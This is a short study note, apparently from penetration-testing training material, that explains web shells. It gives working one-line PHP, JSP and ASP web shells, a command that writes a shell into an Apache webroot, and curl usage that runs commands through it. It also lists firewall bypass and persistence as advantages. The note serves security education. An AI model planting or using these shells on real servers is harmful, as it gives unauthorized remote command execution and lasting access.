## Definition

A [[Web Shell]] is a type of [[Shell]] typically implemented as a web script (e.g., [[PHP]], [[ASPX]], [[JSP]]). It accepts commands through [[HTTP]] request parameters (like `GET` or `POST`), executes them on the server, and returns the output within the web page response.

## Writing a Web Shell

A web shell script is often a short one-liner. Here are examples for common web languages:

```php
<?php system($_REQUEST["cmd"]); ?>
```

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

```asp
<% eval request("cmd") %>
```

---

## Uploading a Web Shell

To use a web shell, the script file must be placed in the remote host's web directory (webroot) to allow its execution via the web server. This might be achievable through:
- A file upload vulnerability.
- Direct writing to the webroot if [[Remote Code Execution (RCE)]] is already achieved.

First, identify the webroot directory. Common defaults include:

| Web Server          | Default Webroot      |
| ------------------- | -------------------- |
| [[Apache]]        | `/var/www/html/`     |
| [[Nginx]]         | `/usr/local/nginx/html/` |
| [[IIS]]           | `c:\\inetpub\\wwwroot\\` |
| [[XAMPP]]         | `C:\\xampp\\htdocs\\`    |

Once the webroot is identified, use available command execution (e.g., `echo`) to write the shell script. For example, on a Linux host running Apache:

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

## Accessing a Web Shell

After uploading, access the web shell using a browser or a tool like [[cURL]]. Append the command as a parameter (e.g., `?cmd=id`):

Browser Example URL: `http://SERVER_IP:PORT/shell.php?cmd=id`

![UID, GID, and groups set to www-data.](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Using [[cURL]]:

```shell-session
Iskandeur@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Advantages

- **Firewall Bypass:** Often bypasses egress firewall rules as commands run over standard web ports (e.g., 80, 443).
- **[[Persistence]]:** The shell file remains after system reboots, allowing command execution without re-exploiting the initial vulnerability.

### Disadvantages

- **Interactivity:** Less interactive than [[Reverse Shell|reverse]] and [[Bind Shell|bind shells]], requiring separate requests for each command. Automation scripts (e.g., in Python) can create semi-interactive experiences.